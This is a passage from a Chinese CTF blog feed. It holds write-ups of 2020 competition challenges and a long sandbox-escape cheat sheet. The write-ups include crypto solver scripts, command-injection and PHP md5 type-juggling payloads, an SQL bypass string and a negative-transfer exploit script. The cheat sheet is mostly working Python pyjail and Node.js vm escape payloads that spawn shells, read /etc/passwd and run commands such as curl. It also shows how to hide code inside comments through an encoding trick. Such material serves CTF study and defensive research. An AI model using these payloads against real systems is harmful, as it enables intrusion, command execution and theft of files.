dic.items(): flag+=chr(int(s[k:k+v])) print(flag) ​ 差一点 https://ctfshow.lanzous.com/iNbACg62edg It’s so easy,you can trytrysee. JSFUCK编码，去掉最后的()，在浏览器Console中运行得flag。 ​ 第三关 CRYPTO派的挑战我们不吃荤 https://hub.ctfer.com/file/crypto1.zip 只有二进制的世界是不是有些无聊 查看文件，只有0,1,2三种数字，猜测为3进制，转换为16进制后，出现多个3X模式的子串，猜测转为字符；转换后又有0,1,2,3,4四中数字，猜测为5进制，转换为16进制后，又出现多个3X模式的子串…… 不断尝试发现规律，需要转换的进制均为素数进制（不吃荤？）。中间需要不断尝试输出结果以确定进制数，注意int()函数的第二参数仅支持36及以下数值的转换，大于36的情况需要自行实现进制转换函数change()。脚本解： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990s=open(&#x27;c.txt&#x27;,&#x27;r&#x27;).read()s=int(s,3)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,5)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,7)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,11)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,13)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,17)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,19)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,23)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,29)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=int(s,31)s=hex(s)[2:]s=bytes.fromhex(s).decode()#int不支持k&gt;36dic=&#123;&#125;for i in range(10): dic[chr(ord(&#x27;0&#x27;)+i)]=ifor i in range(26): dic[chr(ord(&#x27;a&#x27;)+i)]=i+10for i in range(26): dic[chr(ord(&#x27;A&#x27;)+i)]=i+10+26print(dic)def change(s,k): j=0 res=0 for i in range(len(s)): res+=dic[s[len(s)-i-1]]*pow(k,j) j+=1 return res s=change(s,37)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=change(s,41)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=change(s,43)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=change(s,47)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=change(s,53)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=change(s,59)s=hex(s)[2:]s=bytes.fromhex(s).decode()s=change(s,61)s=hex(s)[2:]s=bytes.fromhex(s).decode()#flagprint(s) ​ 天仙金丹心法 https://hub.ctfer.com/file/crypto2.zip 道在屎溺 ○ 须要：次想把常面知本用都部道文哈是用已本连希无来比净题续即用凑如妙道密进可的字真法在海码行：○ 数灭自屎凡器只三后全而神然溺鼎归心 查询知此为中文栅栏解密，且每一栏递增，还原： 竖着读，用常见md5计算三次即为flag。 123456789from hashlib import md5s=open(&#x27;题目.txt&#x27;,&#x27;rb&#x27;).read()s=md5(s).hexdigest()s=md5(s.encode()).hexdigest()s=md5(s.encode()).hexdigest()print(s)open(&#x27;out.txt&#x27;,&#x27;w&#x27;).write(s) ​ Knapsack My Number Theory Book https://hub.ctfer.com/file/crypto3.zip hint1: 1112222333333 mod (10^7)=2333333hint2: Knapsack Cryptosystem 有机会参与Crypto的压轴题出题~~ 不过好像没有人碰= = 其实这题是一个数论题与背包加密系统的套娃题。 源代码： 123456789101112131415161718192021222324252627from json import dumpfrom random import SystemRandomfrom hashlib import *random = SystemRandom()k, n, d = 15, 40, 0.4B = 2**(n//d)A = [random.randint(1, B) for _ in range(n)]s = sum(A[index] for index in random.sample(range(n), k))part = int(str(int.from_bytes(str(s).encode(), byteorder=&#x27;little&#x27;) &lt;&lt; 10000)[-175:])dump((A,part), open(&quot;data&quot;, &quot;w&quot;))print(s)print(part)inp = input(&quot;Please input the solution (0, 1, 0, 1, ...): &quot;)sol = [int(i) for i in inp.split(&#x27;,&#x27;)]assert sum(i == 1 for i in sol) == kassert len(sol) == nassert all(i == 0 or i == 1 for i in sol)if sum(x*a for x, a in zip(sol, A)) == s: m = md5(&#x27;&#x27;.join(str(i) for i in sol).encode()).hexdigest() print(f&quot;TQL!! flag is &#123;m.join([&#x27;flag&#123;&#x27;, &#x27;&#125;&#x27;])&#125;&quot;) 外层是 $n=40,k=15,d=0.4$ 的背包密码系统，即40维子集和问题，解向量重量为15，背包密度为0.4（40长度的01解向量数组中含15个1）； 内层是需要一点数论知识才能从part求解出的s，即子集和的值； 求解出01解向量组成的字符串md5哈希值即为flag。 内层 int.from_bytes(bytes, byteorder, *, signed=False) 可实现不固定长度的bytes类型数据转int类型数据，byteorder标志小字节顺序还是大字节顺序 根据part值还原s值，其中byteorder=&#39;little&#39;代表小端序（反序），假设 $t$ 为 $s$ 反序字符串对应的int值，$p$ 为part值，根据已知关系有： t左移10000位后后175位值为part。 因 $a&lt;&lt;b \\Rightarrow a\\cdot 2^b$ ，故 $t&lt;&lt;10000 \\Rightarrow t\\cdot 2^{10000}$，又 $t\\cdot 2^{10000}$ 以 175位的 $p$ 结尾，即： $p = (t\\cdot 2^{10000}) \\bmod (10^{175})$ 但此时不能直接应用模逆运算计算出 $t$ ，因为 $\\gcd(2^{10000},10^{175}) \\neq 1$； 做一下转换： $p \\equiv (t\\cdot 2^{10000}) \\pmod {10^{175}} \\ \\Rightarrow t\\cdot 2^{10000}=x\\cdot 10^{175}+p$ 分解 $p$ 发现： $p=2^{176} \\cdot 3 \\cdot 43973 \\cdot 69653 \\cdot 6642192645148709014118321101167435034612406484841133642520224597359790421504311588434603251039359463852561066413$ 设 $y=\\cfrac{p}{2^{175}}$，则 $t\\cdot 2^{10000}=x\\cdot 10^{175}+2^{175}\\cdot y \\ \\Rightarrow t\\cdot 2^{9825}=x\\cdot 5^{175}+ y \\ \\Rightarrow y \\equiv t \\cdot 2^{9825} \\pmod {5^{175}} \\ \\Rightarrow y \\cdot (2^{9825})^{-1} \\equiv t \\pmod {5^{175}}$ 通过求模逆可还原 $t$ ，再还原出 $s$。 123456789101112131415from gmpy2 import invertn = pow(5,175)p = 5845718273413614238047854434058144506973237928951593664100212455023083304425941087047510727554535833686148194478724602632928856425119454505382766186798132132909079456410238976y = p // pow(2,175)k = pow(2, 9825, n)kinv = int(invert(k, n))t = (y * kinv) % nprint(t)#t=int.from_bytes(str(s).encode(), byteorder=&#x27;little&#x27;)s = int(bytes.fromhex(hex(t)[2:])[::-1])print(s)#sum 外层 小规模的背包密码系统，可以直接用常见LLL算法攻击，参考： https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/knapsack/knapsack-zh/ Sage脚本： 123456789101112131415161718192021222324252627282930313233import binascii# open the public key and strip the spaces so we have a decent arraypubKey = [291261609902039997017727282042, 323900844596016068072642445649, 266988452026099177894210813748, 408729576966214254532209048947, 437048374902001262457529358416, 45441859606116873131092743344, 51312372228432799205402860932, 446894113383896613780223791057, 387275979896657368942582580348, 106191812735537081768832792472, 314442025322217482482346876963, 458938676660836185669115411856, 624514817837775109409742774239, 223466848034665041761802574065, 317380931967330048573366834100, 305525458686341075758884485721, 477363540414430757340867483621, 538724147876064506850294590869, 147986153711350097748394541291, 237604431565908226570207609923, 168061497374145289079315904395, 226257393036905506618868519191, 606131084939410793557726750445, 229847073637282132507525425264, 189589107972678036785075475201, 258811229764745601613575317649, 188968262675983804863009858052, 594623692847436704500625622597, 494291994428984378953385211372, 602493249658184503910046469358, 196950288482747513670119067849, 300975486828861896159703499663, 606100573531309594132334686576, 330763266814750730387569732411, 169247067050997623804446808122, 488060887558585221461996453780, 235957723689777110563629411239, 617280674032071480762572507845, 1187994588804681817349174099, 286948311141611416450158085330]nbit = len(pubKey)# open the encoded messageencoded = 4823023867810203947898718813977print(&quot;start&quot;)# create a large matrix of 0&#x27;s (dimensions are public key length +1)A = Matrix(ZZ, nbit + 1, nbit + 1)# fill in the identity matrixfor i in range(nbit): A[i, i] = 1# replace the bottom row with your public keyfor i in range(nbit): A[i, nbit] = pubKey[i]# last element is the encoded messageA[nbit, nbit] = -int(encoded)res = A.LLL()for i in range(0, nbit + 1): # print solution M = res.row(i).list() flag = True for m in M: if m != 0 and m != 1: flag = False break if flag: print(i, M) M = &#x27;&#x27;.join(str(j) for j in M) # remove the last bit M = M[:-1] print(&#x27;&#x27;.join([str(i) for i in M])) ​ 第四关 逆向派的挑战第五关 胖派的挑战 弱鸡略过Hard Re+PWN~ ​ 第六关 没技术是菜鸡大魔王最菜的boss https://hub.ctfer.com/file/boss.zip 菜鸡中的战斗机 源码： 12345678import wmiimport timefor i in [&#x27;N&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;N&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;B&#x27;,&#x27;N&#x27;]: wmi.WMI(namespace=&#x27;root\\WMI&#x27;).WmiMonitorBrightnessMethods()[0].WmiSetBrightness(Brightness=ord(i), Timeout=500) time.sleep(char(&#x27;!&#x27;))#菜鸡中的BOSS，简称菜包丝 无需知道wmi包及其函数（设置LCD背光亮度）的含义，N和B两字符替换为0和1，转16进制再转字符，简单粗暴。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2020首届钓鱼城杯国际网络安全创新大赛","slug":"match-2020首届钓鱼城杯国际网络安全创新大赛","date":"2020-08-27T12:52:20.000Z","updated":"2020-08-27T13:41:24.217Z","comments":true,"path":"2020/08/27/match-2020首届钓鱼城杯国际网络安全创新大赛/","permalink":"https://lazzzaro.github.io/2020/08/27/match-2020%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF%E5%9B%BD%E9%99%85%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"​ 再次水过的赛，rank-110/382。 Misc签到题 flag{Welcome_to_dycb} 简单粗暴。 ​ whitespace 附件：test 内容一片空白，第一反应想到snow隐写，用snow工具解密得无意义内容。 拖到010editor查看16进制，发现三种字符0x20、0x09、0x0A，其中0x0A数量少且按一定长度出现，猜测为分隔符，回到text中将0x20替换为0，0x09替换为1，再2进制转字符，得到flag。 ​ Cryptoconfused_flag nc 119.3.45.222 9999 每次nc都是不同结果，但出现的字符及数量不变，只是乱序，正确顺序能还原flag。 栅栏解密无果，尝试循环取1000次字符串以统计字母在不同位置出现的频次，按大小顺序依次取对应数量字符填入flag： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#coding=utf-8from pwn import *#统计各字符数any_s=&#x27;flag&#123;beadfe08-7fee-3;dd9;961-b7efb21;9;65&#125;-d9;;8&#x27;dic=&#123;&#125;for i in any_s: if i not in dic: dic[i]=0 dic[i]+=1print(dic)s=[]flag=&#x27;?&#x27;*42#循环取1000个字符串用于统计for i in range(1000): print(i) try: r=remote(&#x27;119.3.45.222&#x27;,9999,timeout=2) s.append(r.recvline()) r.close() except: passdic2=&#123;&#125;for ss in s: for i in range(len(ss)): if ss[i] not in dic2: dic2[ss[i]]=&#123;&#125; if i not in dic2[ss[i]]: dic2[ss[i]][i]=0 dic2[ss[i]][i]+=1 for k,v in dic2.items(): if k.strip()!=&#x27;&#x27;: print((k,dic[k])) res=sorted(v.items(), key=lambda d:d[1], reverse = True) print(res[:dic[k]]) for j in dic[k]: flag[res[j][1]]=k print(flag)","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2020第四届强网杯全国网络安全挑战赛","slug":"match-2020第四届强网杯全国网络安全挑战赛","date":"2020-08-23T03:48:59.000Z","updated":"2020-08-27T12:50:44.767Z","comments":true,"path":"2020/08/23/match-2020第四届强网杯全国网络安全挑战赛/","permalink":"https://lazzzaro.github.io/2020/08/23/match-2020%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B/","excerpt":"","text":"​ 又称PWN杯，题型分类数量严重不均。不记奇怪的MIX分类【强网先锋】，数量：PWN=(Crypto+Misc)×3。 没做出几题，蒟蒻。 Misc签到简单粗暴。 ​ 强网先锋主动 http://39.96.23.228:10002 简单RCE。 /?ip=127.0.0.1;ls 列目录发现 flag.php； /?ip=127.0.0.1;cat flag.php 提示 no flag，过滤了关键字 flag； /?ip=127.0.0.1;a=ag.php;b=fl;cat $b$a 绕过关键字，查看注释拿到flag。 ​ Funhash hash is really fun. http://39.101.177.96/ 绕过套娃。 level 1 $_GET[&quot;hash1&quot;] != hash(&quot;md4&quot;, $_GET[&quot;hash1&quot;]) md4加密前后字符串相等，PHP弱类型比较，易想到科学计数法表示的0e开头字符串可绕过。 寻找满足条件的0e串： 1234567891011121314151617$i = 0;$c = 0;while (true) &#123; if ((++$c % 1000000) == 0) &#123; printf(&quot;.&quot;); &#125; $n = &quot;0e&quot; . $i++; $h = hash(&#x27;md4&#x27;, $n); if ($n == $h) &#123; printf(&quot;\\nFound: $n\\n&quot;); break; &#125;&#125;//Found: 0e251288019 PAYLOAD1: hash1=0e251288019 level 2 $_GET[&#39;hash2&#39;] === $_GET[&#39;hash3&#39;] || md5($_GET[&#39;hash2&#39;]) !== md5($_GET[&#39;hash3&#39;]) 需要hash2和hash3的值相等且md5值不等，强类型比较，所以只能用经典数组方法绕过。 md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的。 PAYLOAD2: hash2[]=aaa&amp;hash3[]=bbb level 3 $query = &quot;SELECT * FROM flag WHERE password = &#39;&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;&#39;&quot;; md5(string,raw) string 必需。规定要计算的字符串。raw 可选。规定十六进制或二进制输出格式：TRUE - 原始 16 字符二进制格式；FALSE - 默认，32 字符十六进制数。 寻找一个字符串，其md5值的16字符二进制形式能使 WHERE 部分为真，用经典绕过字符串ffifdyop，经过md5函数后结果为 &#39;or&#39;6�]��!r,��b。 PAYLOAD3: hash4=ffifdyop ​ upload 附件：data.pcapng Wireshark查看流量包，发现steghide.php，内含一张jpg图，导出并还原 根据文件名steghide提示，steghide隐写，命令一把梭，密码为弱密码123456： steghide extract -sf steghide.jpg -p 123456 ​ bank nc 39.101.134.52 8005 hint: pow的字符集为大小写字母+数字 nc交互题，过了sha256认证后，输入名字： 可以发现初始cash=10，而get flag需要cash=1000。 transact可以与任一用户交易cash，view records可以查看交易值大于100的记录，provide a record 提供交易记录，hint发现交易加密方式为ECB，加密内容为发送者+接收者+交易值。 既然需要从cash=10增加到cash=1000，由于transact的交易额没有任何限制，那么交易负值岂不可以从任一用户处得到cash？尝试发现居然可行，直接非预期拿到flag，神奇三血…… 12345678910111213141516171819202122232425from pwn import *from parse import *from pwnlib.util.iters import bruteforceimport stringfrom hashlib import sha256def brute_force(prefix,s): return bruteforce(lambda x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=3)r = remote(&quot;39.101.134.52&quot;,8005)data = r.recvline()prefix, s = parse(&quot;sha256(XXX+&#123;&#125;) == &#123;&#125;&quot;,data)r.recvuntil(&#x27;Give me XXX:&#x27;)r.sendline(brute_force(prefix,s))r.recvuntil(&#x27;teamtoken:&#x27;)r.sendline(&#x27;icq109e2eff64d5d38cd2a0191b42cff&#x27;)r.recvuntil(&#x27;give me your name:&#x27;)r.sendline(&#x27;ssss&#x27;)r.recvuntil(&#x27;&gt;&#x27;)r.sendline(&#x27;transact&#x27;)r.recvuntil(&#x27;&gt;&#x27;)r.sendline(&#x27;ttt -1000&#x27;)r.recvuntil(&#x27;&gt;&#x27;)r.sendline(&#x27;get flag&#x27;)print(r.recvall())","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"沙盒逃逸","slug":"misc-沙盒逃逸","date":"2020-08-21T12:00:36.000Z","updated":"2025-04-24T12:54:03.829Z","comments":true,"path":"2020/08/21/misc-沙盒逃逸/","permalink":"https://lazzzaro.github.io/2020/08/21/misc-%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/","excerpt":"","text":"​ 沙盒逃逸 / 沙箱逃逸沙箱逃逸，就是在给我们的一个代码执行环境下（Oj或使用socat生成的交互式终端），脱离种种过滤和限制，最终成功拿到shell权限的过程。 Python / Pyjail内置函数/变量123456789101112dir() #不带参数时,返回当前范围内的变量、方法和定义的类型列表；带参数时,返回参数的属性、方法列表globals() #全局变量locals() #局部变量chr()/ord() #字符与ASCII码转换open() #读文件input() #输入__import__() #载入模块__builtins__ #包含当前运行环境中默认的所有函数与类__file__ #该变量指示当前运行代码所在路径__class__ #当前对象所属的类，如&#x27;&#x27;.__class__会返回&lt;class &#x27;str&#x27;&gt;__base__ #当前类的基类，如str.__base__会返回&lt;class &#x27;object&#x27;&gt;__doc__ #类的帮助文档，默认类均有帮助文档 模块1234567891011121314151617181920#osimport osos.system(&#x27;dir&#x27;)os.popen(&#x27;dir&#x27;).read()#platformimport platformplatform.popen(&#x27;dir&#x27;).read()platform.os.system(&#x27;dir&#x27;)#timeitimport timeittimeit.timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;)#sysfrom sys import modulesmodules[&#x27;os&#x27;].system(&#x27;sh&#x27;)modules[&#x27;posix&#x27;].system(&#x27;sh&#x27;)sys._getframe().f_locals.values() import1234__import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)__builtins__.__dict__[&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;sh&#x27;)(lambda: __import__(&#x27;os&#x27;).system(&#x27;sh&#x27;))()(__builtins__:=__import__(&#x27;os&#x27;))and(lambda:system)()(&#x27;sh&#x27;) 重载模块 / 重新引入1234567891011#得到完整__builtin__模块reload(__builtin__)import impimp.reload(__builtin__)#重新引入osimport syssys.modules[&#x27;os&#x27;]=&#x27;/usr/lib/python2.7/os.py&#x27;execfile(&#x27;/usr/lib/python2.7/os.py&#x27;) dis模块解析1234#dis.code_info限制names数量__getattribute__ = (None).__getattribute__(&#x27;__class__&#x27;);__getattribute__ = __getattribute__.__getattribute__(__getattribute__, &#x27;__base__&#x27;);__getattribute__.__getattribute__(__getattribute__.__getattribute__(__getattribute__.__getattribute__(__getattribute__, &#x27;__subclasses__&#x27;)()[84](), &#x27;load_module&#x27;) (&#x27;os&#x27;), &#x27;system&#x27;) (&#x27;sh&#x27;) 函数调用 / 命令执行 / 交互1234567891011121314151617181920212223242526272829303132#属性/字典getattr(__import__(&#x27;os&#x27;),&#x27;system&#x27;)(&#x27;dir&#x27;)__import__(&#x27;os&#x27;).__getattribute__(&#x27;system&#x27;)(&#x27;dir&#x27;)__import__(&#x27;os&#x27;).__dict__.__getitem__(&#x27;system&#x27;)(&#x27;dir&#x27;)#os._wrap_close类().__class__.__base__.__subclasses__()[-4].__init__.__globals__[&#x27;system&#x27;](&#x27;sh&#x27;) #object类 - warnings.WarningMessage类().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].__dict__[&#x27;system&#x27;](&#x27;ls&#x27;)().__class__.__base__.__subclasses__()[137].__init__.__globals__[&#x27;system&#x27;](&quot;sh&quot;)#help()函数#参考#https://cheatsheet.haax.fr/linux-systems/programing-languages/python/#pyjail-generate-a-shell#https://blog.maple3142.net/2021/07/05/0CTF-2021-quals-writeups/#pypypypy#https://satoooon1024.hatenablog.com/entry/2021/12/15/SECCON_CTF_2021_Writeup#misc-hitchhike-16-solves#https://ptr-yudai.hatenablog.com/entry/2021/12/19/232158#Misc-227pts-hitchhike#http://tttang.com/archive/1428/#toc_0x03-2seccon-2021-hitchhikehelp() =&gt; os =&gt; !shhelp() =&gt; __main__help() =&gt; [filename]#调试器#pdb模块定义了一个交互式源代码调试器，用于Python程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意Python代码。它还支持事后调试，可以在程序控制下调用。breakpoint()#_posixsubprocess.fork_exec#不同的python版本的_posixsubprocess.fork_exec接受的参数个数不一样#参考https://ctftime.org/writeup/31883import os__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) 文件读取123456open(&#x27;1.txt&#x27;).read()#object类().__class__.__base__.__subclasses__()[40](&quot;1.txt&quot;).read()().__class__.__bases__[0].__subclasses__()[40](&quot;1.txt&quot;).read()&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](&quot;1.txt&quot;).read() 关键字过滤1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&#x27;sys&#x27;+&#x27;tem&#x27; =&gt; &#x27;system&#x27;&#x27;X19pbXBvcnRfXw==&#x27;.decode(&#x27;base64&#x27;) =&gt; &#x27;__import__&#x27;&#x27;&#x27;.join([&#x27;__imp&#x27;,&#x27;ort__&#x27;]) =&gt; &#x27;__import__&#x27;&#x27;__tropmi__&#x27;[::-1] =&gt; &#x27;__import__&#x27;&#x27;__imp&#x27;+&#x27;ort__&#x27; =&gt; &#x27;__import__&#x27;&#x27;__buihf9ns__&#x27;.replace(&#x27;hf9&#x27;,&#x27;ldi&#x27;) =&gt; &#x27;__buildins__&#x27;dir()[0] =&gt; &#x27;_&#x27;eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)) =&gt; __import__(&quot;os&quot;)bytes([46, 47, 102, 108, 97, 103]).decode() =&gt; &#x27;./flag&#x27;import codecsgetattr(os,codecs.encode(&quot;flfgrz&quot;,&#x27;rot13&#x27;))(&#x27;ifconfig&#x27;)#unicode字符 / Non-ASCII Identifies# 𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳# 𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡𝕒𝕓𝕔𝕕𝕖𝕗𝕘𝕙𝕚𝕛𝕜𝕝𝕞𝕟𝕠𝕡𝕢𝕣𝕤𝕥𝕦𝕧𝕨𝕩𝕪𝕫#清空setattr(__import__(&quot;__main__&quot;), &quot;blacklist&quot;, list())#过滤evalexec(&quot;import os;os.system(&#x27;curl xxx&#x27;)&quot;)#过滤数字0=False1=True=all(())2=True+True=True-(-True)3=True+True+True=True-(-True)-(-True)#过滤request#字符串request:list(globals().keys())[11]#request值：globals()[list(globals().keys())[11]]#过滤引号chr(123)str()#字符串连接&#x27;&#x27;.join([&#x27;a&#x27;,&#x27;b&#x27;])# 自定义错误消息引发错误raise OSError(locals()[chr(102)+chr(108)+chr(97)+chr(103)])#盲注time.sleep(3) if open(&#x27;/flag&#x27;).read()[0]==&#x27;c&#x27; else 1flag.index(&#x27;flag&#123;...&#x27;)type(flag.split())(type(flag.split())(flag).pop(&#123;..&#125;).encode()).remove(&#123;..&#125;)#其他技巧eval(input())breakpoint() #调试模式help()(lambda:os.system(&#x27;/bin/sh&#x27;))()(__builtins__:=__import__(&#x27;os&#x27;))and(lambda:system)()(&#x27;sh&#x27;) #过滤点setattr(copyright,&#x27;__dict__&#x27;,globals()),delattr(copyright,&#x27;breakpoint&#x27;),breakpoint()[*open(&quot;flag&quot;+chr(46)+&quot;txt&quot;)] #open未过滤，read过滤raise Exception(flag) #报错外带#修饰符@exec@inputclass A: pass 注释逃逸井号Python 中的编解码器 raw_unicode_escape 允许Python文件解释Unicode编码的字符，使用 raw_unicode_escape 编码器将 \\uxxxx 解释成对应的ASCII字符，比如换行符 \\u000a ，这样可以在 Python 的注释中隐藏恶意代码。 12345#!/usr/bin/env python# -*- coding: raw_unicode_escape -*-#\\u000aimport os#\\u000aos.system(&quot;ls /&quot;)#\\u000aos.system(&quot;cat /flag&quot;) 参考： [PyJail] python沙箱逃逸探究·总览 三引号python处理字符串的过程是先用line-delimiter分开 然后每行再视为一个C null-terminated string进行处理。 所以&lt;NUL&gt;字符会影响这一过程 所以我们只需要将 &#39;&#39;&#39; 中的一个 &#39; 替换为 &#39;\\x00\\n 即可。 参考： mishandling of c-strings in parser NKCTF 2024 - 🐍ex1t eval变量覆盖12345# a=&#123;&#x27;test&#x27;:0&#125; =&gt; a=&#123;&#x27;test&#x27;:1&#125;[[str][0]for[a[&#x27;test&#x27;]]in[[1]]]#环境变量[[str][0]for[os.environ[&#x27;test&#x27;]]in[[&#x27;xxx&#x27;]]] 其他工具https://github.com/YannickJadoul/Parselmouth ​ node.js前端在前端中，可能会使用删除 eval ，重写 Function.prototype.constructor / GeneratorFunction / AsyncFunction 等方式来完成前端的沙箱。在这种情况下，可以使用创建一个新iframe的方式来获取新的执行环境。 服务端JavaScript提供了原生的vm模块，用于隔离了代码上下文环境。但是在该环境中依然可以访问标准的JavaScript API和全局的NodeJS环境。 在原生的沙箱模块中，常用的逃逸方式为： 12345678const sandbox = &#123;&#125;;const whatIsThis = vm.runInNewContext(` const ForeignObject = this.constructor; const ForeignFunction = ForeignObject.constructor; const process = ForeignFunction(&quot;return process&quot;)(); const require = process.mainModule.require; require(&quot;fs&quot;);`, sandbox); 一般来说，在Context下运行的代码应该只属于该隔离环境。然而，this是一个特别的，this指向runInContext(line, context)这一句里的context变量，它属于沙盒外，实际上，它是一个&#123;&#125;。 1234567891011//列目录this.constructor.constructor(&#x27;return this.process.binding&#x27;)()(&#x27;fs&#x27;).readdir(&#x27;/&#x27;,function (err, data) &#123;data&#125;)//读文件this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;fs&quot;).readFileSync(&quot;/etc/passwd&quot;).toString()//命令执行&quot; &quot;.toString.constructor(&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /etc/passwd&#x27;).toString()&quot;)()const &#123;spawnSync&#125; = this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&#x27;child_process&#x27;) spawnSync(&#x27;cat /flag&#x27;, [], &#123;stdio: &#x27;inherit&#x27;&#125;); 如果this为null，并且也没有其他可以引用的对象，想要逃逸则要用到一个函数中的内置对象的属性arguments.callee.caller，它可以返回函数的调用者。 只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的arguments.callee.caller就会返回沙箱外的一个对象，在沙箱内就可以进行逃逸。 12345678910111213141516171819202122232425262728// 方法1throw new Proxy(&#123;&#125;, &#123; // Proxy 对象⽤于创建对某⼀对象的代理, 以实现属性和⽅法的拦截 get: function()&#123; // 访问这个对象的任意⼀个属性都会执⾏ get 指向的函数 const c = arguments.callee.caller const p = (c[&#x27;constru&#x27;+&#x27;ctor&#x27;][&#x27;constru&#x27;+&#x27;ctor&#x27;](&#x27;return pro&#x27;+&#x27;cess&#x27;))() return p[&#x27;mainM&#x27;+&#x27;odule&#x27;][&#x27;requi&#x27;+&#x27;re&#x27;](&#x27;child_pr&#x27;+&#x27;ocess&#x27;)[&#x27;ex&#x27;+&#x27;ecSync&#x27;](&#x27;cat /flag&#x27;).toString(); &#125;&#125;)throw new Proxy(&#123;&#125;, &#123; get: function()&#123; const cc = arguments.callee.caller; const p = (cc.constructor.constructor(&#x27;return procBess&#x27;.replace(&#x27;B&#x27;,&#x27;&#x27;)))(); const obj = p.mainModule.require(&#x27;child_procBess&#x27;.replace(&#x27;B&#x27;,&#x27;&#x27;)); const ex = Object.getOwnPropertyDescriptor(obj, &#x27;exeicSync&#x27;.replace(&#x27;i&#x27;,&#x27;&#x27;)); return ex.value(&#x27;whoami&#x27;).toString(); &#125;&#125;)// 方法2let obj = &#123;&#125; // 针对该对象的 message 属性定义⼀个 getter, 当访问 obj.message 时会调⽤对应的函数obj.__defineGetter__(&#x27;message&#x27;, function()&#123;const c = arguments.callee.callerconst p = (c[&#x27;constru&#x27;+&#x27;ctor&#x27;][&#x27;constru&#x27;+&#x27;ctor&#x27;](&#x27;return pro&#x27;+&#x27;cess&#x27;))()return p[&#x27;mainM&#x27;+&#x27;odule&#x27;][&#x27;requi&#x27;+&#x27;re&#x27;](&#x27;child_pr&#x27;+&#x27;ocess&#x27;)[&#x27;ex&#x27;+&#x27;ecSync&#x27;](&#x27;cat/flag&#x27;).toString();&#125;)throw obj 考虑到JavaScript原生vm模块的缺陷，有开发者设计了vm2来提供一个更安全的隔离环境，但是在旧版本中同样存在一些逃逸方式，例如： 12345vm.runInNewContext( 